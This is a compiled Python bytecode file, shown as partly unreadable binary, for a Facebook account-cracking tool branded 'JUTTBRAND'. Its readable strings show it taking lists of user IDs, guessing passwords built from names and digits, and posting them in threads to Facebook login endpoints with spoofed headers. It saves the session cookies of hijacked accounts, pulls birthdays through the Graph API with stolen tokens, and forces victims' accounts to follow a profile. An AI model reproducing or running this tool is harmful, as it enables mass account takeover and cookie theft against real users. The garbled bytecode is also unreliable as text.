o

0�b�A�
@s�ddlZzddlZWneyed�e�d�YnwzddlZWney5ed�e�d�YnwzddlZWneyNed�e�d�YnwddlZddlZddlZddlZddl	Z	ddl
Z
ddlZddlZddl
Z
ddlZddlZddlZddlZddlZddlZddlZddlmZdd	lmZdd
lmZe��ZejZgd�Zzedks�edkr�e�ed
ZWney�e�Ynwe��Z e j!Z"e jZ#e j$Z%eeZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.e'e(e)e*e+e,e-e.gZ/e
�0e/�Z1iiZ2Z3d\Z4a5Z6gggZ7Z8Z9ga:ga5gZ;gZ<da=dZ>dZ?dZ@ddiZAddddddddd d!d"d#d$�ZBd%ZCd&d'�ZDd(ZEd)d*�ZFd+d,�ZGGd-d.�d.�ZHd/d0�ZId1d2�ZJeJ�e�d3�d4d5�ZKGd6d7�d7�ZLeG�dS)8�Nu!
 [✓] installing requests !...
zpip install requestsu 
 [✓] installing futures !...
zpip install futuresu
 [✓] installing bs4 !...
zpip install bs4)�ThreadPoolExecutor)�datetime)�
BeautifulSoup)�January�February�March�April�May�June�JulyZAgustus�	September�October�November�December��z[1;97mz[1;31mz[1;32mz[0m)rrrzhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]rrrrr	r
rZAugustusrr
rr)�01�02�03Z04Z05Z06Z07Z08Z09Z10Z11Z12FcCs2|dD]}tj�|�tj��t�d�qdS)N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�e�r�KAMI.py�jalanEs

�r!uV   
[0;93m                                          

'##::: ##::'#######:::'#######::'########:::::::::::
 ###:: ##:'##.... ##:'##.... ##: ##.... ##::::::::::
 ####: ##: ##:::: ##: ##:::: ##: ##:::: ##::::::::::
 ## ## ##: ##:::: ##: ##:::: ##: ########::'#######:
 ##. ####: ##:::: ##: ##:::: ##: ##.. ##:::........:
 ##:. ###: ##:::: ##: ##:::: ##: ##::. ##:::::::::::
 ##::. ##:. #######::. #######:: ##:::. ##::::::::::
..::::..:::.......::::.......:::..:::::..:::::::::::[0;95mTOOL BY AWAIS♥️

[0;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[0;93mAUTHOR   : AWAIS TAHIR
 
[0;93mFACEBOOK : TAHIR (JUTTBRAND
 
[0;93mGITHUB   : JUTTBRAND

[0;93mYOUTUBE  : TECHNICAL MASTER

[0;93mSUPPORT  : DARLINGTON(GHOSTSON) X AWAIS(JUTTBRAND)
 
[0;93mTOOLS    :[0;95m FILE CLONING
[0;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                              
cCsdt|�dks	t|�dkr0tdttttt��f�tdtttt|��f�td�t�dSdS)Nrz8

 [1;92mTOTAL OK : [1;92m %s  [1;92mJUTTBRAND_OK.txtz5 [1;91mTOTAL CP :[1;91m   %s [1;91JUTTBRAND_CP.txtz [1;92mPRESS ENTER TO BACK MENU )�len�print�H�P�str�ok�input�sarfraz)ZOK�cprrr �hasilas
�r+cCs�t�d�tt�t�t���}d}|d}ttd�td�td�td�}|dvr2t	��
t�|dvr;t�d	�|d
vrB	dSdS)N�clear��originz [1] START FILE CLONINGz
 [2] EXIT z [?] CHOOSE OPTION : ��1r��2rzpython dm.py)�3r)�os�systemr#�logo�requests�get�url_ip�jsonr(�__xxx__�sarfrazx�id)ZipmZtodzZIPZ_sarfraz___rrr r)js"

�r)c@s4eZdZdd�Zdd�Zdd�Zdd�Zd	d
�ZdS)r;cCs
g|_dS)N)r=)�selfrrr �__init__�s
z__xxx__.__init__cCsxt�d�tt�td�|_t|j�����|_	t�d�tt�td�d}|dvr1|�
�dStd�|�|�dS)Nr,zPUT FILE NAME : r-�y)ZyesZYes�Yr@z [!] CHOOSE CORRECT ONE)r4r5r#r6r(Zcnt�open�read�
splitlinesr=�__pler__r<)r>r=Z___worldwide___rrr r<�s


z__xxx__.sarfrazxcCs�tj�dt�dt|j��dtt��dtt��d�	�tj���z2|D�]'}|�	�}t
��}|ddddd	d
ddd
dddd�
}|jd|�d�|d�}t
�dt|j���d�t
�dt|j���d�|d|dd�}|ddd|ddddd
ddd
d|dddd�}	|jd|�d �||	d!d"�}
d#|j��vr�d$�d%d&�|j����D��}td't�d(|�d)|���d*||f}t�|�td+d,��d-|�|�||�n�d.|j��v�rKzBtd/���}
|�d0|�d1|
�����d2}|�d3�\}}}t|}td4t ||f�d*||f}t�|�td5d,��d-|�Wn6t!t"f�y'd6}d6}d6}YnYtd4t ||f�d*||f}t�|�td5d,��d-|�nq#td7aWdS|�#|||�YdS)7Nz
[1;92m[CRACKING] �|z [ok][z] [cp][z] r0z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZcors�emptyZdocumentzhttps://m.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)
�Host�upgrade-insecure-requestsr�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagezhttps://zV/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)�headerszname="lsd" value="(.*?)"rzname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)ZlsdZjazoest�uidZflow�pass�nextz	max-age=0z!application/x-www-form-urlencodedz�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36ZXMLHttpRequest)rHz
cache-controlrIr.zcontent-typerrJrKrLrMrNrOrPrQrRz-/login/device-based/validate-password/?shbl=0F)�datarSZallow_redirectsZc_user�;cSsg|]
\}}|d|�qS)�=r)�.0�key�valuerrr �
<listcomp>�sz&__xxx__.__metode__.<locals>.<listcomp>�
z[JUTTBRAND-OK] z | z%s|%szJUTTBRAND_OK.txt�az%s
Z
checkpointz
.token.txtzhttps://graph.facebook.com/z?fields=birthday&access_token=Zbirthday�/z
%s[JUTTBRAND-CP] %s | %s zJUTTBRAND_CP.txtr-)$rrr�loopr"r=r'r*r�lowerr7ZSessionr8�re�searchr&�text�groupZpost�cookiesZget_dict�join�itemsr#r$�appendrB�followrCr:�split�	bulan_ttl�M�KeyError�IOError�
__metode__)r>�userZ__chi__ZcebokZpw�session�header�rZdasZheader1Zpo�cokiZwrtZtokenzZcp_ttl�month�day�yearrrr rq�s�4

��	
�


z__xxx__.__metode__cCsNt|jdd|id�jd�}|jddd��d�}|jd	t|�d|id�jdS)
Nz:https://mbasic.facebook.com/profile.php?id=100007607054845Zcookie)rgzhtml.parserr_ZIkuti)�stringZhrefzhttps://mbasic.facebook.com)rr8re�findr&)r>rsrvrur8rrr rk�s z__xxx__.followcCs,td�td�td�}|dkrtd�|��dS|dvr�t�d�tt�td�td	�td
t|j��td�td	�tdd
��n}|jD]b}z[|�	d�\}}|�	d�}t|�dkspt|�dkspt|�dkspt|�dkr�||dd|d|d|ddg}n||dd|d|d|ddg}dg}|�
|j||d�WqIYqIWd�n1s�wYtt
t�dS|dv�r�t�d�tt�td�td�}td�}	td�}
td�}t�d�tt�td �td	�td!t|j��td"�td	�tdd
��q}|jD]e}z]|�	d�\}}|�	d�}t|�dk�s:t|�dk�s:t|�dk�s:t|�dk�rO||dd|d|d|ddg}n||dd|d|d|ddg}|�
|j||d�W�qY�qWd�n	1�s�wYtt
t�dStd#�|��dS)$Nz[1] CRACK WITH AUTO PASS z[2] CRACK WITH NAME DIGIT PASSz
[?] CHOOSE : r-z
SELECT CORRECT ONEr/r,z,[1;91m
USE FLIGHT (airplane) MODE ON[1;96mz2--------------------------------------------------z[1;36mTOTAL IDS : %s z[1;36mCRACKING STARTED.....�)Zmax_workersrF� ����rZ123rZ12345Z786110zmbasic.facebook.comr1z&[1;32m
ENTER LAST NAME DIGITs[1;32m
z
  Name + 1 : z
  Name + 2 : z
  Name + 3 : z
  Name + 4 : z4[1;31m
USE FLIGHT (airplane) MODE BEFORE USE[1;32mz[1;32mTOTAL IDS : %s z[1;32mCRACKING STARTED.....z
 Select Valid One)r#r(rEr4r5r6r"r=�
sarfrazssbrlZsubmitrqr+r'r*)r>ZchiZssbworldZzsbrT�name�xzZpwxZp1Zp2Zp3Zp4rrr rE�sx


0*(��




8*(��z__xxx__.__pler__N)�__name__�
__module__�__qualname__r?r<rqrkrErrrr r;�sVr;c
	Csxt�d�tt�ddlm}td�zd}t�|�}t|d��	�}Wnt
tfy1t�Ynwzd}t�|�}t
�|�j}Wnt
jjyStd�t�Ynw||vrbt�d	�t�dSt�d�tt�td
�tttd|d�ttd
�ttd�td�tttd�tttd�}td�td�}td�td�d|d|}	t�d|	�dS)Nr,r)�quotez	Checking For Subscription...
�-x��OI,I���z%�E���i�9����E�%����<}rus>x��())(���/J,�K�,�(M*-N-J��+I�+�K���710���/�uw
�/��M���O&!&z[0;37mNo Internet Connectionrz%[1;97m
Your Token Is Not Subscribed
z
[1;97m Your Token : rz
Tool Price free
�
jazzcash Account Number 007
�
Account Name NO NAME
z(
Payment Successfully Msg Or Token Send
�%
Paste Here Payment Successfully Msg:�
Paste Here your Token:z%
Your Request Submitted Please wait  �jHello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20�%20Token%20:%20�#am start https://wa.me/+92007?text=)r4r5r#r6Zurllib.parser��zlib�
decompressrBrCrorp�bnsregr7r8re�
exceptions�ConnectionError�exit�fuckrjr)r()
r��f�bd�toZbtZbwru�sb�ss�tksrrr �bnsbuy1sZ


�

�


r�cCs�tt���tt���}d�|�}td�td|�td�z1t�d�j}||vr<td�tt���}t	�
d�WdStd�t�d	�t	�
d�t�
�WdSt�
�td
krftt�t�YdSYdS)NrFu�[1;92m╭────────────────────────────────────────────╮u.[1;97m [[1;91m•[1;97m][1;93m  YOUR ID : u�[1;92m╰────────────────────────────────────────────╯z=https://github.com/JUTTBRAND/Juttbrand/blob/main/Approval.txtuB[1;97m [[1;92m•[1;97m][1;97m  YOUR ID IS ACTIVE........[97mrur[1;97m [[1;91m•[1;97m][1;93m YOUR ID IS NOT ACTIVE SEND MESSAGE ON WHATSAPP FREE USER PLEASE DONT INBOX[97mz#xdg-open https://wa.me/+97696784016�__main__)r&r4�geteuid�getloginrhr#r7r8rerrr5rr�r�r6�chk)�uuidr=ZhttpCaht�msgrrr r�`s,



�r�r,cCst�d�tt�td�ttt�t��d��dd���d}ttd|d�ttd�ttd	�td
�ttd�tt	d�}td�t	d
�}td�td�d|d|}t�d|�d}t
�|�}t|d�}|�
|�|��t�d�t�d�t�dS)Nr,z%[1;97m	Your Token Is Not Subscribed
r�z~SSB==z
[1;97m Your Token: [97mrz
Tool Price FREE
r�r�z
Payment Successfully Send
r�r�z$Your Request Submitted Please wait  r�r�r�r��wr~)r4r5r#r6r&r�Zuuid1Zgetnode�upperr(r�r�rBr�closerrr�)r=r�r�r�r�r�Zsavrrr r�{s<
$





r�c@seZdZdd�ZdS)�loadcCs^d}td�}td�}|d8}|d7}ttd��D]}td�tj��t�d�qtd�dS)	Nr-Z30�0rr0z
 Please Wait ....g�������?r)�int�ranger#rrrrr)r>�_�__Z___�trrr r?�s
z
load.__init__N)r�r�r�r?rrrr r��sr�)Mr4r7�ImportErrorr#r5Zconcurrent.futuresZ
concurrentZbs4rc�platformrr:rZrandomr�
subprocessZ	threading�	itertools�base64r�r�rr�rZnowZctrw�nZbulanr�ZnTemp�
ValueErrorZcurrentry�taZburxZha�opr%rnr$�K�B�U�O�NZmy_color�choiceZwarnarWZdata2Zamanr*ZsalahZubahPr�ZpwBarur'r=rrraZ
url_lookupZurl_mbr9Zheader_gruprmZdoner!r6r+r)r;r�r�r�r�rrrr �<module>s�����
��


	//


